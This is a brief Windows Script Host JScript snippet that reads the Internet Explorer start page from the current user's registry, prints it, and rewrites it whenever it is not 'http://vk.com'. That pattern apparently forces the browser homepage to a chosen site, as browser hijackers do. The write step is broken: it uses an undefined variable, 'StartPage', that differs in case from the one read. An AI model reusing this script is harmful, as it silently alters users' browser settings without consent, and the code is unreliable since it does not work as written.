Myshell = new ActiveXObject("WScript.Shell");
var startPage = Myshell.RegRead("HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page");
WSH.echo(startPage);
if (startPage != 'http://vk.com')
	Myshell.RegWrite("HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page", StartPage);